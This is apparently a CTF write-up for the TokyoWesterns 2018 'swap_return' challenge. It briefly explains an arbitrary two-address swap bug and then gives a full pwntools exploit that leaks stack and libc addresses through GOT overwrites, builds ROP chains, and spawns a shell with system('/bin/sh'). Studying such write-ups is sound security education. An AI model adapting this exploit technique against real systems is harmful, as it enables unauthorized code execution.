---
title: Swap_return
date: 2018-09-06 16:15:50
tags: pwn
layout: post
---
TokyoWesterns CTF 4th 2018

swap_return 
<!--more-->
# Swap Returns
[bin][1]



## 0x00 pre
* rewrite func's got to main to grow stack
* write into stack and do swap to make ropchain
## 0x01 Analysis
漏洞点在swap
```c
tmp = *p1;
*p1 = *p2;
*p2 = tmp;
tmp = 0LL;
```

允许任意两地址的值交换

* 一开始我们利用atoi和printf的got值交换来泄露stack
* 利用rop去leak libc(利用改exit为main或者start去抬栈)
* do system call


## 0x02 EXP
```python
from pwn import *
#context.log_level="debug"
def swap(a1,a2):
	set2(a1,a2)
	p.readuntil("choice: \n")
	p.send("2".ljust(2))
def set2(a1,a2):
	p.readuntil("choice: \n")
	p.send("1".ljust(2))
	p.readuntil("address: \n")
	p.sendline(str(a1))
	p.readuntil("address: \n")
	p.sendline(str(a2))
def ext():
	p.readuntil("choice: \n")
	p.send("3".ljust(2))
p=process("./swap")
p.readuntil("choice: \n")
p.send("7".ljust(2))
atoi_got=0x601050
printf_got=0x601038
exit_got=0x601018
puts_plt=0x4006a0
pop_rdi_ret=0x400a53
gets_plt=0x1
leave=0x4008e7
puts_got=0x601028
swap(atoi_got,printf_got)

p.readuntil("choice: \n")
p.send("%p")
data=p.read(0xe)
data=int(data,16)
log.info(hex(data))
#leak stack
p.readuntil("choice: \n")
p.send("2".ljust(2))
#swap back
start=data+138
swap(exit_got,start)
#data+42,data+50
set2(pop_rdi_ret,puts_got)
ext()
main=0x4008e9
#data-230,data-222
set2(puts_plt,main)
ext()
#data-502,data-494

set2(main,leave)
ext()

gad1=data+42
gad2=data+50
gad3=data-230
gad4=data-222
gad5=data-502
gad6=data-494

rop=data-734
swap(rop+0,gad1)#p64(pop_rdi_ret)
swap(rop+8,gad2)#p64(puts_got)
swap(rop+16,gad3)#p64(puts_plt)
swap(rop+24,gad5)#p64(start)
swap(exit_got,gad6)


#swap ret & main to grow stcak

p.sendafter("choice: \n","3 ")
p.readuntil("Bye. ")

leak=p.readline()
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
base=u64(leak[:-1].ljust(8,"\0"))
libc.address=base-libc.symbols['puts']


one_gadget=0x4526a+libc.address
system=libc.symbols['system']
sh=libc.search("/bin/sh").next()
swap(exit_got,gad4)
ext()

set2(sh,system)#data-718
ext()
set2(leave,pop_rdi_ret)#data-870
ext()

gad7=data+(0x7fffffffd900-0x7fffffffdc26)#(sh)
gad8=gad7+8
gad9=data-870#(leave)
gad10=data-862#(pr)
rop=0x7fffffffd8a8-0x7fffffffdc26+data
swap(rop+0,gad10)
swap(rop+8,gad7)
swap(rop+16,gad8)
gdb.attach(p,'''b * 0x4009c8''')
swap(exit_got,gad9)
ext()
p.interactive(">>")
```

## review

* 一开始的printf着实没想到...
* rop做了很久...
* 太菜了！

[1]:https://github.com/n132/banana/tree/master/Pwn/TokyoWesterns%20CTF%204th%202018/swap_return